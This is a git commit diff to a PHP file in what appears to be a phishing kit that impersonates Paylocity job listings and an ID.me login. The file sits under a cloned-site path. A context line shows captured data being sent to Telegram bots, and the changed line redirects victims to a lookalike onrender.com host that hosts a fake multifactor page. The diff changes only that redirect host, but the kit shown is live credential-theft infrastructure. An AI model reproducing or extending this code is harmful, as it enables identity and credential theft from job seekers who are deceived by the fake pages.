7af77f2e4a81b405f6c0a3e4834890e36704b25d
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-04-07 23:11:33 +0100

    link new

--- public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/session/new.php
+++ public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/session/new.php
@@ -86,7 +86,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://thepaylocityhr.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
+header("Location:https://thepaylocity-hr.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
 exit;
 }
 ?>
